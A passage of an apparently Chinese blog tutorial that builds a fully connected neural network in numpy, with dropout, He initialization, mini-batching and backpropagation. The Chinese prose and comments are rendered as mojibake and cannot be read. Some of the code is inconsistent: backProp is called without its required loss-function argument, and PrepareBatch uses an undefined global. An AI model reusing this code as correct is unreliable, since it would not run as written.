np.array(y).ravel()</span><br><span class="line">    r = np.zeros((length, width))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        r[i][<span class="built_in">int</span>(y[i])] = <span class="number">1.0</span></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddBias</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="comment"># åœ¨ç¬¬0åˆ—æ’å…¥å…¨ä¸º1çš„åˆ—</span></span><br><span class="line">    x = np.matrix(x)</span><br><span class="line">    <span class="keyword">return</span> np.c_[np.ones((x.shape[<span class="number">0</span>], <span class="number">1</span>)), x]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RemoveBias</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="comment"># å»æ‰ç¬¬ä¸€åˆ—</span></span><br><span class="line">    <span class="keyword">return</span> np.matrix(x)[:, <span class="number">1</span>:]</span><br></pre></td></tr></table></figure>    </div></div><h3 id="FCNN-class"><a href="#FCNN-class" class="headerlink" title="FCNN class"></a>FCNN class</h3><p>ä»¥ä¸‹å¼€å§‹å¡«å……<code>FCNN</code>ç±»</p><p>æ˜ç¡®ä¸€ä¸‹ç±»ä¸­çš„åŸºæœ¬å‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FCNN</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Init</span>(<span class="params">self, unitNum</span>)</span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">PrepareBatch</span>(<span class="params">self, X, y, batchSize=<span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">fit</span>(<span class="params">self, epoch, rate</span>)</span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">gradDes</span>(<span class="params">self, rate</span>)</span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">backProp</span>(<span class="params">self</span>)</span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">forwardProp</span>(<span class="params">self</span>)</span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">ClrTempResult</span>(<span class="params">self</span>)</span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">predict</span>(<span class="params">self, X, y</span>)</span></span><br></pre></td></tr></table></figure><p>æ˜ç¡®ä¸€äº›æ¦‚å¿µ</p><ul><li>batchSizeï¼šå¦‚æœæ•´ä¸ªè¿‡å®Œä¸€éè®­ç»ƒé›†ä¸­çš„æ•°æ®æ‰æ›´æ–°ä¸€æ¬¡æƒé‡ï¼Œåˆ™æ›´æ–°é€Ÿåº¦è¿‡æ…¢ï¼Œæ•…å°†æ•°æ®é›†æ‹†åˆ†ä¸ºå¤šæ‰¹æ¥å¤„ç†ï¼ŒbatchSizeå°±æ˜¯ä¸€æ‰¹æ•°æ®æœ‰å¤šå°‘ä»½æ ·æœ¬</li><li>epochï¼šæ€»å…±è¦è¿‡å‡ éå®Œæ•´çš„æ•°æ®ï¼Œæ‰€ä»¥æƒé‡çš„æ›´æ–°æ¬¡æ•°å°±æ˜¯<code>epoch*N/batchSize</code>ï¼Œå…¶ä¸­<code>N</code>æ˜¯è®­ç»ƒé›†æ ·æœ¬æ€»é‡</li><li>backward Propagationï¼šåå‘ä¼ æ’­ï¼ŒæŒ‡é€šè¿‡æ¢¯åº¦æ¥è°ƒæ•´æƒé‡çš„è¿‡ç¨‹<strong>ï¼ˆé‡ç‚¹ï¼‰</strong></li><li>forward Propagationï¼šå‰å‘ä¼ æ’­ï¼ŒæŒ‡ä¼ å…¥æ ·æœ¬åå¾—åˆ°è¾“å‡ºç»“æœçš„è¿‡ç¨‹</li></ul><p>ä»¥ä¸Šæ¦‚å¿µè™½ç„¶åè¯æ˜¯åœ¨æœ¬æ–‡ä¸­ç¬¬ä¸€æ¬¡å‡ºç°ï¼Œä½†ç»“åˆä¸Šæ–‡éƒ½ä¸éš¾ç†è§£</p><p>è€Œè®­ç»ƒè¿‡ç¨‹ä¸­è¿˜æœ‰ä¸€ä¸ªç§°ä½œ<code>DropOut</code>çš„ä¼˜åŒ–æ–¹æ³•ï¼ŒæŒ‡çš„æ˜¯åœ¨è®­ç»ƒä¸­éšæœºåœ°ææ­»ä¸€äº›ç¥ç»å…ƒï¼Œå‰å‘ä¼ æ’­çš„æ—¶å€™ä¸ç»è¿‡ä»–ä»¬ï¼Œåå‘ä¼ æ’­çš„æ—¶å€™ä¹Ÿä¸æ›´æ–°ä»–ä»¬ï¼Œä»è€Œä½¿å¾—æ¨¡å‹æ›´å…·é²æ£’æ€§ï¼Œä¹Ÿå¯ä»¥æœ‰æ•ˆé¿å…æ¨¡å‹è¿‡æ‹Ÿåˆï¼ˆè¿‡æ‹Ÿåˆï¼šæ¨¡å‹æ³›åŒ–ä¸å¥½ï¼Œè®­ç»ƒé›†å’Œæµ‹è¯•é›†çš„è¯†åˆ«å‡†ç¡®ç‡ç›¸å·®è¿‡å¤§ï¼‰ï¼Œå…³äº<code>DropOut</code>ä¸ºä»€ä¹ˆèƒ½å¢å¼ºæ¨¡å‹é²æ£’æ€§ã€é¿å…è¿‡æ‹Ÿåˆçš„è¯´æ³•æœ‰å¾ˆå¤šï¼Œå»ºè®®è‡ªå·±æœï¼ˆæ‡’</p><p>ç„¶åæˆ‘ä»¬è‚¯å®šå¸Œæœ›æ¨¡å‹å¯ä»¥ä¿å­˜ä¸‹æ¥ï¼Œè‡³å°‘è®­ç»ƒå‡ºæ¥çš„æƒé‡å¾—èƒ½ä¿å­˜å§ï¼Œä¸ç„¶æ¯æ¬¡éƒ½å¾—é‡æ¥ä¸€é</p><p>æ‰€ä»¥å†è¡¥å‡ ä¸ªå‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FCNN</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetDropOut</span>(<span class="params">self</span>)</span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">SaveParameters</span>(<span class="params">self</span>)</span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">LoadParameters</span>(<span class="params">self</span>)</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­<code>backProp</code>çš„å…¬å¼æ¨å¯¼è¿™ä¸ªé‡ç‚¹é—®é¢˜æ”¾åˆ°ä¸‹é¢çš„æ¨¡å—æ¥è¯´ï¼Œè¿™é‡Œåˆ™å†æä¸€äº›å°ä¸€ç‚¹çš„é—®é¢˜</p><ul><li><p>æƒé‡çš„åˆå§‹åŒ–æ–¹æ³•</p><p>  é€‰æ‹©é”™è¯¯çš„æƒé‡åˆå§‹åŒ–æ–¹æ³•ä¼šå¯¼è‡´æ¢¯åº¦æ¶ˆå¤±ç­‰ä¸¥é‡é—®é¢˜ï¼Œå¯èƒ½å¯¼è‡´è®­ç»ƒæ ¹æœ¬æ— æ³•å¼€å§‹ï¼Œç”±äºæˆ‘é€‰æ‹©çš„æ˜¯<code>ReLU</code>ä½œä¸ºéšè—å±‚çš„æ¿€æ´»å‡½æ•°ï¼Œä½¿ç”¨äº†<code>He initialization</code>ï¼Œå…·ä½“ä¸ºä»€ä¹ˆè¿™æ ·çš„åˆå§‹åŒ–å¯¹<code>ReLU</code>ä¼šæ›´å‹å¥½åˆ™æ²¡æœ‰æ·±å…¥æ¢ç©¶</p></li><li><p>æ­£åˆ™é¡¹</p><p>  æœ‰ä¸€ç§é˜²æ­¢è¿‡æ‹Ÿåˆçš„æ–¹æ³•æ˜¯ï¼šåœ¨æŸå¤±å‡½æ•°ä¸­åŠ å…¥æœ‰å…³æƒé‡<code>w</code>çš„äºŒæ¬¡é¡¹ï¼Œè¿™æ ·åœ¨<code>dw</code>ä¸­å°±ä½“ç°åœ¨æ¯æ¬¡æ›´æ–°æƒé‡æ—¶æƒé‡éƒ½ä¼šè‡ªå‡ä¸€ç‚¹ç‚¹</p></li><li><p>DropOutçš„å…·ä½“å®ç°</p><p>  åˆ›å»ºä¸<code>w</code>åŒæ ·sizeçš„çŸ©é˜µï¼Œå°†æœ¬è½®ä¸­ææ­»çš„ç¥ç»å…ƒçš„è¡Œä¸åˆ—ç½®<code>0</code>ï¼Œå…¶ä»–ç½®<code>1</code>ï¼Œä¼ é€’æ—¶æŠŠ<code>w</code>æ¢æˆ<code>np.multiply(w,dropOut)</code>å³å¯</p></li></ul><div class='spoiler collapsed'>    <div class='spoiler-title'>        Source    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FCNN</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Init</span>(<span class="params">self, unitNum, dropOutProb=[]</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        å®Œæˆä¸€äº›åˆå§‹åŒ–</span></span><br><span class="line"><span class="string">        unitNum: list æ¯ä¸€å±‚çš„ç¥ç»å…ƒæ•°é‡</span></span><br><span class="line"><span class="string">        dropOutProb: list é™¤äº†è¾“å‡ºå±‚ä»¥å¤–æ¯ä¸€å±‚çš„dropOutæ¦‚ç‡(0,1)</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        self.unitNum = unitNum</span><br><span class="line">        self.layerNum = <span class="built_in">len</span>(unitNum)</span><br><span class="line">        self.dropOutProb = dropOutProb <span class="keyword">if</span> dropOutProb <span class="keyword">else</span> [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.layerNum - <span class="number">1</span>)]</span><br><span class="line">        self.outLength = unitNum[-<span class="number">1</span>]</span><br><span class="line">        self.w = [<span class="number">0</span>]  <span class="comment"># 0 çš„ä½œç”¨ä»…ä¸ºå ä½</span></span><br><span class="line">        self.Z = [<span class="number">0</span>]</span><br><span class="line">        self.A = [<span class="number">0</span>]</span><br><span class="line">        self.cost = []</span><br><span class="line">        self.costTemp = []</span><br><span class="line">        self.dwNorm = []</span><br><span class="line">        self.dwNormTemp = []</span><br><span class="line">        <span class="comment"># He initializationï¼Œé’ˆå¯¹éšè—å±‚æ˜¯reLuæ¿€æ´»å‡½æ•°çš„æƒé‡åˆå§‹åŒ–æ–¹æ³•</span></span><br><span class="line">        <span class="comment"># æ­£ç¡®çš„æƒé‡åˆå§‹åŒ–æ–¹æ³•èƒ½ä¸€å®šç¨‹åº¦é¿å…æ¢¯åº¦æ¶ˆå¤±</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, self.layerNum - <span class="number">1</span>):</span><br><span class="line">            np.random.seed(i)  <span class="comment"># è®¾ç½®éšæœºæ•°ç§å­</span></span><br><span class="line">            self.w.append(np.matrix(np.random.randn(unitNum[i - <span class="number">1</span>] + <span class="number">1</span>, unitNum[i])) * np.sqrt(<span class="number">2</span> / unitNum[i]))</span><br><span class="line">            self.w[-<span class="number">1</span>][<span class="number">0</span>] = np.matrix(np.zeros((<span class="number">1</span>, unitNum[i]))) <span class="comment"># biasåç½®åˆå§‹åŒ–ä¸º0</span></span><br><span class="line">        <span class="comment"># æœ€åçš„æƒé‡åˆå§‹åŒ–å’Œä¹‹å‰çš„ä¸å¤ªä¸€æ ·ï¼Œéœ€è¦æ›´åŠ æ¥è¿‘0ï¼Œè¿™æ˜¯é’ˆå¯¹sigmoid/softMax</span></span><br><span class="line">        np.random.seed(self.layerNum - <span class="number">1</span>)</span><br><span class="line">        self.w.append(np.matrix(np.random.rand(unitNum[-<span class="number">2</span>] + <span class="number">1</span>, unitNum[-<span class="number">1</span>])))</span><br><span class="line">        self.w[-<span class="number">1</span>] = (self.w[-<span class="number">1</span>] - np.mean(self.w[-<span class="number">1</span>])) / np.std(self.w[-<span class="number">1</span>]) / <span class="number">100</span></span><br><span class="line">        self.w[-<span class="number">1</span>][<span class="number">0</span>] = np.matrix(np.zeros((<span class="number">1</span>, unitNum[-<span class="number">1</span>])))</span><br><span class="line">        self.ClrTempResult()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">PrepareBatch</span>(<span class="params">self, X, y, batchSize=<span class="number">0</span></span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        åˆ†å‰²è®­ç»ƒé›†å¹¶å®Œæˆä¸€äº›åˆå§‹åŒ–</span></span><br><span class="line"><span class="string">        batchSize: æ¯ä¸€æ‰¹æ ·æœ¬çš„æ•°é‡ï¼Œéœ€èƒ½è¢«æ ·æœ¬æ€»æ•°æ•´é™¤</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        N = X.shape[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> batchSize:</span><br><span class="line">            batchSize = N</span><br><span class="line">        <span class="keyword">if</span> N % batchSize:</span><br><span class="line">            print(<span class="string">&quot;# ERR: illegal batchSize&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.batchSize = batchSize</span><br><span class="line">        self.batchTime = <span class="built_in">int</span>(N / batchSize)</span><br><span class="line">        self.X = np.matrix(X)</span><br><span class="line">        self.y = OneHot(X.shape[<span class="number">0</span>], unitNum[-<span class="number">1</span>], y)</span><br><span class="line">        self.batchX = []</span><br><span class="line">        self.batchy = []</span><br><span class="line">        self.batchTime = <span class="built_in">int</span>(N / batchSize)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.batchTime):</span><br><span class="line">            <span class="comment"># mini-batchå¯ä»¥åŠ å¿«è®­ç»ƒé€Ÿåº¦</span></span><br><span class="line">            self.batchX.append(np.array(self.X[i * batchSize : (i + <span class="number">1</span>) * batchSize]))</span><br><span class="line">            self.batchy.append(self.y[i * batchSize : (i + <span class="number">1</span>) * batchSize])</span><br><span class="line">            print(<span class="string">&quot;\rPreparing: %.2f%%&quot;</span> % ((i + <span class="number">1</span>) / N * batchSize * <span class="number">100</span>), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fit</span>(<span class="params">self, epoch, rate</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        epoch: int è®­ç»ƒè½®æ¬¡</span></span><br><span class="line"><span class="string">        rate: float å­¦ä¹ ç‡</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        N = self.X.shape[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(epoch):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(self.batchTime):</span><br><span class="line">                self.Z[<span class="number">0</span>] = self.batchX[j]</span><br><span class="line">                self.A[<span class="number">0</span>] = self.batchX[j]</span><br><span class="line">                self.y = self.batchy[j]</span><br><span class="line">                self.gradDes(rate)</span><br><span class="line">                self.ClrTempResult()</span><br><span class="line">                print(</span><br><span class="line">                    <span class="string">&quot;\rTotalProgress: %.2f%% BatchProgress: %.2f%%  &quot;</span></span><br><span class="line">                    % (((i + <span class="number">1</span>) / epoch * <span class="number">100</span>), ((j + <span class="number">1</span>) / N * self.batchSize * <span class="number">100</span>)),</span><br><span class="line">                    end=<span class="string">&quot;&quot;</span>,</span><br><span class="line">                )</span><br><span class="line">            <span class="comment"># è®°å½•ä¸€ä¸ªè½®æ¬¡ä¸‹çš„å¹³å‡æŸå¤±å‡½æ•°</span></span><br><span class="line">            self.cost.append(<span class="built_in">sum</span>(self.costTemp) / self.batchTime)</span><br><span class="line">            self.costTemp.clear()</span><br><span class="line">            <span class="comment"># è®°å½•ä¸€ä¸ªè½®æ¬¡ä¸‹çš„å¹³å‡dwçš„L2ï¼Œå³æ¨¡é•¿</span></span><br><span class="line">            self.dwNorm.append(np.<span class="built_in">sum</span>(self.dwNormTemp, axis=<span class="number">0</span>) / self.batchTime)</span><br><span class="line">            self.dwNormTemp.clear()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gradDes</span>(<span class="params">self, rate</span>):</span></span><br><span class="line">        self.backProp()</span><br><span class="line">        <span class="comment"># æ²¡æœ‰åŠ å…¥æ­£åˆ™é¡¹æƒ©ç½šï¼Œå› ä¸ºæœªå‘ç°è¿‡æ‹Ÿåˆç°è±¡ï¼ŒåŒæ—¶æ ·æœ¬è¶³å¤Ÿå¤šæ—¶å¯ä»¥ä¸åŠ å…¥æ­£åˆ™é¡¹</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        # ä¸€ç§è¾ƒä¸ºç®€å•çš„æŸå¤±å‡½æ•° J(Î¸)</span></span><br><span class="line"><span class="string">        J = np.sum(np.multiply(self.y-self.A[-1],self.y-self.A[-1]))/self.batchSize</span></span><br><span class="line"><span class="string">        # è¿™é‡Œä½¿ç”¨æ›´åŠ å¤æ‚çš„å¸¦æœ‰logçš„äº¤å‰ç†µå‡½æ•°</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        J = (-np.<span class="built_in">sum</span>(np.array(self.y) * np.log(self.A[-<span class="number">1</span>]) + np.array(<span class="number">1</span> - self.y) * np.log(<span class="number">1</span> - self.A[-<span class="number">1</span>])) / self.batchSize)</span><br><span class="line">        self.costTemp.append(J)</span><br><span class="line">        dwNt = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(self.w)):</span><br><span class="line">            dwNt.append(np.linalg.norm(self.dw[i]))</span><br><span class="line">            self.w[i] -= rate * self.dw[i]</span><br><span class="line">        self.dwNormTemp.append(dwNt)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetDropOut</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># è·å–dropOutçŸ©é˜µï¼Œæ ¹æ®ç»™å®šæ¦‚ç‡éšæœºå»æ‰ç¥ç»å…ƒ</span></span><br><span class="line">        index = []</span><br><span class="line">        prob = self.dropOutProb[<span class="number">0</span>]</span><br><span class="line">        num = <span class="number">0</span> <span class="keyword">if</span> <span class="keyword">not</span> prob <span class="keyword">else</span> <span class="built_in">int</span>(np.clip(np.random.randn() / <span class="number">50</span> + prob, <span class="number">0</span>, <span class="number">0.75</span>) * self.unitNum[<span class="number">0</span>])</span><br><span class="line">        index.append(np.random.choice(self.unitNum[<span class="number">0</span>], num, <span class="literal">False</span>))</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, self.layerNum - <span class="number">1</span>):</span><br><span class="line">            prob = self.dropOutProb[i]</span><br><span class="line">            num = <span class="number">0</span> <span class="keyword">if</span> <span class="keyword">not</span> prob <span class="keyword">else</span> <span class="built_in">int</span>(np.clip(np.random.randn() / <span class="number">50</span> + prob, <span class="number">0</span>, <span class="number">0.75</span>) * self.unitNum[i])</span><br><span class="line">            index.append(np.random.choice(self.unitNum[i], num, <span class="literal">False</span>))</span><br><span class="line">            dropOutMat = np.ones((self.unitNum[i - <span class="number">1</span>], self.unitNum[i]))</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> index[i - <span class="number">1</span>]:</span><br><span class="line">                dropOutMat[j] = np.zeros((<span class="number">1</span>, self.unitNum[i]))</span><br><span class="line">            dropOutMat = np.transpose(dropOutMat)</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> index[i]:</span><br><span class="line">                dropOutMat[j] = np.zeros((<span class="number">1</span>, self.unitNum[i - <span class="number">1</span>]))</span><br><span class="line">            dropOutMat = np.r_[np.ones((<span class="number">1</span>, self.unitNum[i])), np.transpose(dropOutMat)]</span><br><span class="line">            self.dropOut.append(np.matrix(dropOutMat))</span><br><span class="line">        dropOutMat = np.ones((self.unitNum[-<span class="number">2</span>], self.unitNum[-<span class="number">1</span>]))</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> index[-<span class="number">1</span>]:</span><br><span class="line">            dropOutMat[j] = np.zeros((<span class="number">1</span>, self.unitNum[-<span class="number">1</span>]))</span><br><span class="line">        dropOutMat = np.r_[np.ones((<span class="number">1</span>, self.unitNum[-<span class="number">1</span>])), dropOutMat]</span><br><span class="line">        self.dropOut.append(np.matrix(dropOutMat))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">backProp</span>(<span class="params">self, d_lossFunc, forward=<span class="literal">True</span>, dX=<span class="literal">False</span></span>):</span></span><br><span class="line">        <span class="comment"># æœ‰è¯¦ç»†æ¨å¯¼è¿‡ç¨‹</span></span><br><span class="line">        <span class="keyword">if</span> forward:</span><br><span class="line">            self.forwardProp()</span><br><span class="line">        self.dA[-<span class="number">1</span>] = d_lossFunc()</span><br><span class="line">        <span class="comment"># --- appaly derivative of SoftMax</span></span><br><span class="line">        self.dZ[-<span class="number">1</span>] = []</span><br><span class="line">        Zt = np.array(self.Z[-<span class="number">1</span>])</span><br><span class="line">        dAt = np.array(self.dA[-<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.batchSize):</span><br><span class="line">            self.dZ[-<span class="number">1</span>].append(np.array(d_softMax(np.matrix(Zt[i])) *</span><br><span class="line">                                   np.matrix(dAt[i]).reshape((self.unitNum[-<span class="number">1</span>], <span class="number">1</span>))).ravel())</span><br><span class="line">        self.dZ[-<span class="number">1</span>] = np.matrix(self.dZ[-<span class="number">1</span>])</span><br><span class="line">        <span class="comment"># ---</span></span><br><span class="line">        dw = self.A[-<span class="number">2</span>].T * self.dZ[-<span class="number">1</span>]</span><br><span class="line">        db = np.<span class="built_in">sum</span>(self.dZ[-<span class="number">1</span>], axis=<span class="number">0</span>)</span><br><span class="line">        self.dw[-<span class="number">1</span>] = np.r_[db, dw] / self.batchSize</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(<span class="number">1</span>, self.layerNum - <span class="number">1</span>)):</span><br><span class="line">            self.dA[i] = RemoveBias(self.dZ[i + <span class="number">1</span>] * np.multiply(self.w[i + <span class="number">1</span>], self.dropOut[i]).T)</span><br><span class="line">            self.dZ[i] = np.multiply(d_relu(self.Z[i]), self.dA[i])</span><br><span class="line">            dw = self.A[i - <span class="number">1</span>].T * self.dZ[i]</span><br><span class="line">            db = np.<span class="built_in">sum</span>(self.dZ[i], axis=<span class="number">0</span>)</span><br><span class="line">            self.dw[i] = np.multiply(np.r_[db, dw] / self.batchSize, self.dropOut[i - <span class="number">1</span>])</span><br><span class="line">        <span class="keyword">if</span> dX:</span><br><span class="line">            self.dA[<span class="number">0</span>] = RemoveBias(self.dZ[<span class="number">1</span>] * np.multiply(self.w[<span class="number">1</span>], self.dropOut[<span class="number">0</span>]).T)</span><br><span class="line">            self.dZ[<span class="number">0</span>] = self.dA[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forwardProp</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.GetDropOut()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, self.layerNum - <span class="number">1</span>):</span><br><span class="line">            self.Z.append(AddBias(self.A[-<span class="number">1</span>]) * np.multiply(self.w[i], self.dropOut[i - <span class="number">1</span>]))</span><br><span class="line">            self.A.append(relu(self.Z[-<span class="number">1</span>]))</span><br><span class="line">        self.Z.append(AddBias(self.A[-<span class="number">1</span>]) * np.multiply(self.w[-<span class="number">1</span>], self.dropOut[-<span class="number">1</span>]))</span><br><span class="line">        self.A.append(softMax(self.Z[-<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ClrTempResult</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.Z = self.Z[<span class="number">0</span>:<span class="number">1</span>]</span><br><span class="line">        self.A = self.A[<span class="number">0</span>:<span class="number">1</span>]</span><br><span class="line">        self.dw = <span class="built_in">list</span>(np.repeat(<span class="number">1</span>, self.layerNum, axis=<span class="number">0</span>))</span><br><span class="line">        self.dZ = <span class="built_in">list</span>(np.repeat(<span class="number">1</span>, self.layerNum, axis=<span class="number">0</span>))</span><br><span class="line">        self.dA = <span class="built_in">list</span>(np.repeat(<span class="number">1</span>, self.layerNum, axis=<span class="number">0</span>))</span><br><span class="line">        self.dropOut = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">predict</span>(<span class="params">self, X, 